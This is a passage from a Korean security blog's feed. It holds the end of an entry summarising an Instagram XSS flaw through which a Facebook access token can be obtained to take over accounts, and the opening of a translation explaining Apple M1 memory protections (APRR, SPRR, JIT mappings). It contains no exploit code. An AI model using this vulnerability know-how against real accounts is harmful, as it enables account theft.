&#xC5D4;&#xB4DC; &#xD3EC;&#xC778;&#xD2B8;&#xB85C;&#xBD80;&#xD130; &#xD398;&#xC774;&#xC2A4;&#xBD81; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC740; &#xC778;&#xC2A4;&#xD0C0;&#xADF8;&#xB7A8; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xD574;&#xB2F9; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xD1B5;&#xD574; &#xD398;&#xC774;&#xC2A4;&#xBD81; &#xACC4;&#xC815;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>instagram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] 애플 실리콘 하드웨어의 비밀: SPRR과 Guarded Exception Levels (GXF)</title>
    <link href="/2021/05/16/idioth/apple_silicon_sprr_gxf/"/>
    <url>/2021/05/16/idioth/apple_silicon_sprr_gxf/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. ghidra&#xB85C; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xC628;&#xB2E4;&#xB294; &#xB140;&#xC11D;&#xC774; &#xC65C; &#xAE00;&#xC740; &#xC548; &#xC62C;&#xB9AC;&#xACE0; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xC4F0;&#xACE0; &#xC788;&#xB0D0;&#xACE0;&#xC694;? &#xC0AC;&#xC5F0;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF8;&#xB798; &#xC624;&#xB298; &#xD574;&#xB2F9; &#xAE00;&#xC774; &#xC62C;&#xB77C;&#xAC14;&#xC5B4;&#xC57C; &#xD588;&#xB294;&#xB370;, &#xBD84;&#xC11D;&#xC740; &#xB05D;&#xB0C8;&#xC73C;&#xB098; &#xC774;&#xBC88; &#xC8FC; &#xC81C;&#xAC00; &#xC544;&#xD320;&#xC5B4;&#xC11C; &#xC5B4;&#xC81C; &#xCD9C;&#xADFC;&#xC744; &#xD558;&#xC600;&#xC73C;&#xB098; &#xACC4;&#xC18D;&#xB418;&#xB294; &#xAE30;&#xCE68;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xCAD3;&#xACA8;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC81C;&#xAC00; &#xB2C9;&#xAC12;&#xC744; &#xD574;&#xBC84;&#xB838;&#xC8E0;. &#xD06C;&#xB86C; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1;&#xC744; &#xC124;&#xCE58;&#xD574;&#xB193;&#xACE0; &#xC808;&#xC804; &#xC124;&#xC815;&#xC744; &#xC548; &#xAC74;&#xB4DC;&#xB824;&#xB194;&#xC11C; &#xC811;&#xADFC;&#xC774; &#xC548;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled.png" alt></p><p>&#xC5B4;&#xC81C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC9C0;&#xD558;&#xCCA0; &#xD0C0;&#xACE0; &#xC9D1;&#xC5D0; &#xC624;&#xB2C8; &#xC774;&#xB807;&#xAC8C; &#xB418;&#xC788;&#xB124;&#xC694;. &#xC544;</p><p><img src="/2021/05/16/idioth/apple_silicon_sprr_gxf/Untitled%201.png" alt></p><p>&#xC5BC;&#xB978; &#xC9D1; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC5C5;&#xAE00;&#xC744; &#xD574;&#xC11C; VM&#xC744; &#xC9D1; &#xCEF4;&#xC73C;&#xB85C; &#xB3CC;&#xB9AC;&#xB358;&#xAC00; &#xD574;&#xC57C;&#xACA0;&#xC5B4;&#xC694;&#x2026; &#xC694;&#xC998; &#xAC19;&#xC740; &#xC2DC;&#xAD6D;&#xC5D0; &#xC544;&#xD504;&#xBA74; &#xC9D1;&#xC5D0;&#xC11C; &#xACF5;&#xBD80;&#xB97C; &#xD574;&#xC57C; &#xD558;&#xB2C8;&#xAE4C;&#xC694;! &#xC544;&#xBB34;&#xD2BC; &#x315C;&#x315C;&#x2026; ARM&#xC744; &#xACF5;&#xBD80;&#xD574;&#xBCFC;&#xAE4C; &#xD558;&#xB358; &#xC640;&#xC911;&#xC5D0; &#xB9E5;&#xBD81; M1 &#xCE69;&#xC774; &#xB4F1;&#xC7A5;&#xD558;&#xC600;&#xACE0; &#xADF8;&#xC5D0; &#xAD00;&#xB828;&#xB41C; &#xC790;&#xB8CC;&#xB4E4;&#xC774; &#xB208;&#xC5D0; &#xBCF4;&#xC774;&#xBA74; &#xC7A1;&#xC9C0; &#xC77D;&#xB294; &#xB290;&#xB08C;&#xC73C;&#xB85C; &#xC77D;&#xACE4; &#xD569;&#xB2C8;&#xB2E4;. <del>&#xC0AC;&#xB78C; &#xB180;&#xB9B4;&#xB9CC;&#xD55C; &#xBC84;&#xADF8;&#xB294; &#xC5C6;&#xB294;&#xC9C0;&#x2026; &#xB3D9;&#xC0DD;&#xC774; m1 &#xC5D0;&#xC5B4;&#xB97C; &#xC4F0;&#xAC70;&#xB4E0;&#xC694;.</del> ARM &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB85C; &#xB118;&#xC5B4;&#xC624;&#xBA74;&#xC11C; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xB4F1;&#xC5D0; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xB358; &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB4E4;&#xC5B4;&#xC62C;&#xAE4C;?&#xB77C;&#xB294; &#xAD81;&#xAE08;&#xC99D;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC774;&#xBC88; &#xAE00;&#xC774; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD574; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xC758;&#xBB38;&#xC744; &#xD574;&#xACB0;&#xD574;&#xC904; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;!</p><p>&#xBC88;&#xC5ED;&#xC5D0;&#xB294; &#xC758;&#xC5ED;&#xACFC; &#xC624;&#xC5ED;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2C0;&#xB9B0; &#xBD80;&#xBD84;&#xC774;&#xB098; &#xC774;&#xD574;&#xD558;&#xAE30; &#xD798;&#xB4E0; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xCF54;&#xBA58;&#xD2B8; &#xB2EC;&#xC544;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://blog.svenpeter.dev/posts/m1_sprr_gxf/">Apple Silicon Hardware Secrets: SPRR and Guarded Exception Levels (GXF)</a></p></blockquote><h1 id="&#xC18C;&#xAC1C;"><a href="#&#xC18C;&#xAC1C;" class="headerlink" title="&#xC18C;&#xAC1C;"></a>&#xC18C;&#xAC1C;</h1><p>1&#xB144; &#xC804;&#xC5D0; <a href="https://twitter.com/s1guza">siguza</a>&#xB294; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC7AC;&#xC815;&#xC758;&#xD558;&#xACE0; &#xCEE4;&#xB110;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xCEE4;&#xC2A4;&#xD140; ARM extension <a href="https://siguza.github.io/APRR/">Apple APRR&#xC5D0; &#xAD00;&#xD55C; write-up</a>&#xC744; &#xC791;&#xC131;&#xD588;&#xB2E4;. &#xC774;&#xD6C4; &#xC560;&#xD50C;&#xC774; &#xCD9C;&#xC2DC;&#xD55C; M1 &#xCE69;&#xC740; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; APRR &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBD80;&#xD305; &#xC9C1;&#xD6C4; &#xBCA0;&#xC5B4; &#xBA54;&#xD0C8; &#xCF54;&#xB4DC;&#xB97C; &#xC27D;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC0C8; &#xBC84;&#xC804;&#xC5D0; &#xB300;&#xD55C; &#xB8E8;&#xBA38;&#xAC00; &#xC788;&#xC9C0;&#xB9CC; &#xACF5;&#xC2DD;&#xC801;&#xC778; &#xC790;&#xB8CC;&#xB294; &#xC544;&#xC9C1; &#xC5C6;&#xB2E4;.</p><p>&#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC758; &#xCCAB; &#xBD80;&#xBD84;&#xC740; aarch64&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC;, &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;, &#xC720;&#xC800;/&#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB7B5;&#xD558;&#xAC8C; &#xC18C;&#xAC1C;&#xD558;&#xBA70; &#xC774;&#xC804; Apple SoC&#xC640; &#xAC19;&#xC740; &#xAE30;&#xB2A5;&#xC778; APRR&#xB3C4; &#xC694;&#xC545;&#xD55C;&#xB2E4;. &#xC774;&#xBBF8; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC774;&#xB77C;&#xBA74; &#xB118;&#xC5B4;&#xAC00;&#xB3C4; &#xC88B;&#xB2E4;.</p><p>&#xC704;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xB2E4;&#xB8E8;&#xACE0; &#xB098;&#xC11C; SPRR&#xACFC; GXF&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xB2E4;&#xB8EC;&#xB2E4;. SPRR&#xACFC; GXF&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;&#xB9CC; &#xC54C;&#xACE0; &#xC2F6;&#xC73C;&#xBA74; Asahi Linux &#xC704;&#xD0A4;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><h2 id="MMUs-pagetables-and-kernels"><a href="#MMUs-pagetables-and-kernels" class="headerlink" title="MMUs, pagetables, and kernels"></a>MMUs, pagetables, and kernels</h2><p>ARM CPU&#xB294; x86&#xC758; ring&#xACFC; &#xAC19;&#xC740; <a href="https://developer.arm.com/documentation/102412/0100/Privilege-and-Exception-levels">exception levels</a>&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. EL0&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; userspace&#xC774;&#xBA70; EL1&#xC740; &#xCEE4;&#xB110;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; EL2&#xB294; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;&#xAC00; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. (&#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC704;&#xD55C; EL3&#xB294; M1 &#xCE69;&#xC5D0;&#xB294; &#xC5C6;&#xB2E4;.)</p><p><a href="https://developer.arm.com/documentation/102142/latest/Virtualization-Host-Extensions">Virtualization Host Extensions</a>&#xC774; &#xC788;&#xB294; ARM64 CPU&#xB294; EL2&#xB97C; EL1&#xCC98;&#xB7FC; &#xB9CC;&#xB4E4;&#xC5B4; &#xCEE4;&#xB110;&#xC744; &#xC27D;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xCEE4;&#xB110;&#xC758; &#xC791;&#xC5C5; &#xC911; &#xD558;&#xB098;&#xB294; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC01; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC885;&#xC18D;&#xB418;&#xC5B4; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC744; &#xC54C;&#xB9AC;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xB294; Memory Management Unit&#xC774; &#xC218;&#xD589;&#xD55C;&#xB2E4;. MMU&#xB294; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xC81C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xB9E4;&#xD551;&#xC758; &#xAC00;&#xC7A5; &#xC791;&#xC740; &#xB2E8;&#xC704;&#xB97C; 4 KiB &#xD06C;&#xAE30;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB77C; &#xD558;&#xBA70; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; &#xAC00;&#xC7A5; &#xC8FC;&#xC18C;&#xC640; &#xC2E4;&#xC81C; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xB2E4;. &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774;&#xB098; &#xCEE4;&#xB110;&#xC774; <code>x</code> &#xC704;&#xCE58;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD558;&#xBA74; MMU&#xB294; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; <code>y</code> &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;. &#xCEE4;&#xB110;&#xC740; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xAC01; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB978; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xC138;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xBCC4;&#xB3C4;&#xC758; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC744; &#xC81C;&#xACF5;&#xD55C;&#xB2E4;.</p><p>&#xC774; &#xB9E4;&#xD551; &#xC678;&#xC5D0;&#xB3C4; &#xAC01; &#xD398;&#xC774;&#xC9C0;&#xB294; &#xD2B9;&#xC815; &#xC561;&#xC138;&#xC2A4; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC778;&#xCF54;&#xB529;&#xD558;&#xB294; 4 &#xBE44;&#xD2B8;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. &#xC774; &#xD50C;&#xB798;&#xADF8;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xC77D;&#xAE30; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774;&#xB098; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD639;&#xC740; &#xCEE4;&#xB110;&#xC774; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xACB0;&#xC815;&#xD55C;&#xB2E4;. ARMv8-A CPU&#xC758; &#xAC01; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xD56D;&#xBAA9;&#xC5D0;&#xC11C; 4 &#xBE44;&#xD2B8;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><ul><li><em>UXN</em>, Unprivileged Execute never: &#xC774; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xB79C;&#xB4DC; (EL0) &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC74C;</li><li><em>PXN</em>, Prvileged excute never: &#xC774; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; (EL1) &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC74C;</li><li><em>AP0</em> and <em>AP1</em>:  &#xCEE4;&#xB110;&#xACFC; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0; <code>rw/--</code>, <code>rw/rw</code>, <code>r-/--</code>, <code>r-/r-</code>  &#xC77D;&#xAE30;, &#xC4F0;&#xAE30; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC778;&#xCF54;&#xB529;</li></ul><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xC561;&#xC138;&#xC2A4; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294;&#xB370; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF5;&#xC7A1;&#xD568;(PAN, &#xACC4;&#xCE35; &#xC81C;&#xC5B4;)&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC640; &#xCEE4;&#xB110;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xC5F0;&#xAD00;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC720;&#xC800;&#xB79C;&#xB4DC;&#xB294; <code>rw</code>&#xC774;&#xC9C0;&#xB9CC; &#xCEE4;&#xB110;&#xC5D0;&#xB294; <code>r-</code>&#xB85C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><h2 id="APRR"><a href="#APRR" class="headerlink" title="APRR"></a>APRR</h2><p>&#xAC01; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; EL0/1(&#xC720;&#xC800;/&#xCEE4;&#xB110; &#xBAA8;&#xB4DC;)&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;(&#xC77D;&#xAE30;/&#xC4F0;&#xAE30;/&#xC2E4;&#xD589;)&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; 4&#xAC1C;&#xC758; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC788;&#xB2E4;. APRR&#xC740; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xC5D4;&#xD2B8;&#xB9AC;&#xC5D0; 4&#xAC1C;&#xC758; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83; &#xB300;&#xC2E0;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xB85C; &#xBCC0;&#xACBD;&#xD55C;&#xB2E4;.(&#xC561;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC744; &#xC9C1;&#xC811; &#xC778;&#xCF54;&#xB529;&#xD558;&#xB294; &#xB300;&#xC2E0; 4&#xBE44;&#xD2B8; index [AP1][AP0]PXN][UXN]&#xC73C;&#xB85C; &#xBCD1;&#xD569;&#xB41C;&#xB2E4;.) &#xC774; &#xBCC4;&#xB3C4;&#xC758; &#xD14C;&#xC774;&#xBE14;&#xC740; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xC2E4;&#xC81C; &#xAD8C;&#xD55C;&#xC744; &#xC778;&#xCF54;&#xB529;&#xD55C;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; &#xC77C;&#xBD80; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; userspace&#xC758; &#xC774;&#xB7EC;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xC81C;&#xD55C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC740; &#xCEE4;&#xB110;&#xACFC; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0;&#xC11C; &#xBD84;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xC744; &#xB9CC;&#xB4E4; &#xB54C; &#xC720;&#xC5F0;&#xC131;&#xC744; &#xC81C;&#xACF5;&#xD55C;&#xB2E4;.</p><p>&#xBCF4;&#xD1B5; &#xBAA8;&#xB4E0; &#xAC1C;&#xBCC4; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB824;&#xBA74; &#xB9CE;&#xC740; page walk&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0;&#xB9CC;, APRR&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xAD8C;&#xD55C;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xC811;&#xC801;&#xC778; &#xACC4;&#xCE35;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xB2E8;&#xC77C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC4F0;&#xAE30;&#xB85C; &#xB9CE;&#xC740; &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB354; &#xC790;&#xC138;&#xD55C; &#xC0AC;&#xD56D;&#xC740; <a href="https://siguza.github.io/APRR/">siguza&#xC758; write-up</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="Just-In-Time-&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;"><a href="#Just-In-Time-&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;" class="headerlink" title="Just-In-Time &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;"></a>Just-In-Time &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;</h2><p>&#xBCF4;&#xD1B5; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xACE0;&#xC218;&#xC900; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xAE30;&#xACC4; &#xCF54;&#xB4DC;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xD6C4; &#xBC30;&#xD3EC;&#xB41C;&#xB2E4;. &#xCF54;&#xB4DC;&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911;&#xC5D0; &#xC218;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC544; <code>r-x</code>&#xB85C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xAE30;&#xACC4; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xC704;&#xD574; &#xC0C8; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD55C; &#xD6C4; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; <code>rwx</code>&#xB85C; &#xB9E4;&#xD551;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC560;&#xD50C;&#xC740; &#xC544;&#xC774;&#xD3F0;&#xC5D0;&#xC11C; CPU&#xAC00; &#xBCF4;&#xC99D;&#xB41C; &#xBA85;&#xB839;&#xB9CC; &#xC2E4;&#xD589;&#xD558;&#xAE38; &#xC6D0;&#xD588;&#xC73C;&#xBBC0;&#xB85C; &#xC774;&#xB7F0; &#xB9E4;&#xD551;&#xC744; &#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. &#xBAA8;&#xB4E0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; <code>rxw</code> &#xB9E4;&#xD551;&#xC744; &#xC694;&#xCCAD;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC6D0;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xBCF4;&#xD638; &#xB3D9;&#xC791;&#xC774; &#xBB34;&#xC758;&#xBBF8;&#xD574;&#xC9C4;&#xB2E4;. &#xC77C;&#xBD80; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB9CC; &#xC774;&#xB7EC;&#xD55C; &#xB9E4;&#xD551; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC5B4;&#xB3C4; <code>rxw</code> &#xB9E4;&#xD551;&#xC5D0; shellcode&#xB97C; &#xC791;&#xC131;&#xD558;&#xC5EC; &#xC545;&#xC6A9;&#xC758; &#xB300;&#xC0C1;&#xC774; &#xB420; &#xC218; &#xC788;&#xB2E4;.(<code>rxw</code> &#xC601;&#xC5ED;&#xC744; &#xCC3E;&#xC544; arbitrary write &#xD6C4; jump gadget&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xACA0;&#xC9C0;&#xB9CC;)</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC560;&#xD50C;&#xC740; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; APRR&#xB85C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD2B9;&#xC815; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;(iOS&#xC758; &#xC0AC;&#xD30C;&#xB9AC;, macOS&#xC758; &#xBAA8;&#xB4E0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;)&#xC740; <code>rw-</code>&#xC640; <code>r-x</code>&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xC804;&#xD658;&#xD560; &#xC218; &#xC788;&#xB294; &#xD2B9;&#xC218; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;(<code>[MAP_JIT</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xD1B5;&#xD55C; <code>mmap</code>, <code>pthread_jit_write_protect_np</code>](<a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))&#xC744;">https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))&#xC744;</a> &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; APRR &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xB0B4;&#xBD80;&#xC758; 2 &#xBE44;&#xD2B8;&#xB97C; 